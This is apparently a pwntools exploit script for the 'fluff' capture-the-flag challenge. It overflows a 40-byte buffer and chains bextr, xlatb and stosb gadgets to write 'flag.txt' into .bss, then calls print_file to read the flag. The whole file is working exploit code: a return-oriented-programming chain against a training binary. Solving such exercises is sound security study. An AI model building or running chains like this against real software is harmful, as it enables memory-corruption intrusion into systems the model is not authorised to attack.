from pwn import *

def find_char_addresses(elf, flag):
    """
    Find addresses, for characters in the flag, in the binary
    """
    locations = []
    for char in flag:
        address = read("fluff").find(char) + elf.address
        locations.append(address)
    return locations

def setup_rbx(payload, rax_val, loc):
    """
    Move file-characters into rbx
    """
    payload += p64(0x40062a)                  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    payload += p64(0x4000)                    # rdx val
    payload += p64(loc - rax_val - 0x3ef2)    # rcx val
    return payload

def write_al_to_bss(payload, bss_segment, pop_rdi, index):
    """
    Write content of al into .bss
    """
    payload += pop_rdi
    payload += p64(bss_segment + index)
    payload += p64(0x400639)    # stosb byte ptr [rdi], al; ret;
    return payload

def cat_flag(elf, payload, pop_rdi):
    """
    Call print_file with "flag.txt" from .bss as argument
    """
    payload += pop_rdi
    payload += p64(elf.bss())
    payload += p64(elf.plt.print_file)
    return payload

def create_payload(elf, rop):
    """
    Build the payload
    """
    offset = 40
    pop_rdi = p64(rop.rdi.address)
    flag = b"flag.txt"
    bss_segment = elf.bss()
    rax_val = 0x0b
    locations = find_char_addresses(elf, flag)
    payload = b'A' * offset

    # Write each letter to memory using available gadgets
    for i, loc in enumerate(locations):
        if i != 0 :
            rax_val = flag[i - 1]

        payload = setup_rbx(payload, rax_val, loc)
        payload += p64(0x400628)    # xlatb; ret;
        payload = write_al_to_bss(payload, bss_segment, pop_rdi, i)

    payload = cat_flag(elf, payload, pop_rdi)
    return payload

context.arch = "amd64"
elf = ELF("fluff")
rop = ROP(elf)

payload = create_payload(elf, rop)
p = elf.process()
p.recvuntil(b">")
p.sendline(payload)
print(p.recvall().decode())
